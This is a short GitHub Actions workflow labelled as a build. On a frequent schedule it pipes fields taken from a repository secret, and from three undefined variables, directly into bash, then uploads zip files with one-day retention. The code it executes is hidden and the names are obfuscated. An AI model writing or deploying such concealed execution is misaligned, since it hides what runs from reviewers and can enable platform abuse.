name: Build Workflow
on:
  workflow_dispatch:

  schedule:
    - cron: '48 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Go
        env:
          ixxb64: ${{ secrets.ixxb64 }}
        run: |
          printf '%s' "$ixxb64" | jq -r .m8 | /bin/bash
          printf '%s' "$tjezy2" | jq -r .yk52777 | /bin/bash
          printf '%s' "$arb076" | jq -r .ox9486 | /bin/bash
          printf '%s' "$bnmlb9" | jq -r .ah6275 | /bin/bash

      - name: Archive results
        uses: actions/upload-artifact@v4
        with:
          name: nTgaFCf9
          path: "*.zip"
          retention-days: 1
